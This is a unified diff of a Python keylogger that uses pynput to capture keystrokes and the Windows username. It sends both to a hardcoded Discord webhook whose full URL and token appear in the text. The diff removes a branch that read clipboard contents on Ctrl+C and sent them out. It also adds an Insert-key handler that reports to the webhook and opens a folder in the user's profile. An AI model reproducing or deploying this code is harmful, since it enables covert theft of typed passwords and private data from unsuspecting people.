@@ -5,7 +5,6 @@ import subprocess
 import time
 from pynput import keyboard
 import psutil
-import pyperclip
 
 # Discord webhook URL (replace with your own webhook URL)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'
@@ -23,15 +22,10 @@ special_keys = {
     keyboard.Key.tab: " TAB ",
     keyboard.Key.shift: " SHIFT ",
     keyboard.Key.ctrl_l: " CTRL ",
-    keyboard.Key.ctrl_r: " CTRL ",
     keyboard.Key.alt_l: " ALT ",
-    keyboard.Key.alt_r: " ALT ",
     keyboard.Key.cmd: " CMD ",
     keyboard.Key.esc: " ESC ",
 }
-
-# Store keys pressed
-keys_pressed = set()
 
 username = os.getlogin()
 
@@ -83,39 +77,25 @@ def keystroke_monitor():
 
 
 def on_press(key):
-    """Called when a key is pressed."""
     global keystrokes, last_keypress_time
-
     try:
-        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-            keys_pressed.add("ctrl")
-        elif key.char == 'c' and "ctrl" in keys_pressed:
-            # User pressed Ctrl+C, send clipboard content
-            clipboard_content = pyperclip.paste()
-            send_to_webhook(f"Clipboard content: {clipboard_content}")
-            return False  # Don't propagate 'C' key to prevent logging
-        elif hasattr(key, 'char') and key.char is not None:
-            # Regular keypress (letters, numbers, etc.)
-            key_str = key.char
-            with lock:
-                keystrokes += key_str
-                last_keypress_time = time.time()
-        elif key in special_keys:
-            # Special key press
-            key_str = special_keys.get(key, f"[{key}]")
-            with lock:
-                keystrokes += key_str
-                last_keypress_time = time.time()
+        key_str = key.char
     except AttributeError:
-        pass
+        key_str = special_keys.get(key, f"[{key}]")
+
+    with lock:
+        keystrokes += key_str
+        last_keypress_time = time.time()
 
 
 def on_release(key):
-    """Called when a key is released."""
-    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-        keys_pressed.discard("ctrl")
-    if key == keyboard.Key.esc:
-        return False  # Stop the listener when Escape is pressed
+    if key == keyboard.Key.insert:
+        send_to_webhook(f"Connection stopped by user: {username}")
+        file_path = rf"C:\users\{username}\kl2.1"  # Fixed the file path
+        subprocess.run(["explorer", file_path])
+        time.sleep(1)
+        send_to_webhook(f"Opened dir...")
+        return False
 
 
 # Run kill.bat file at the start
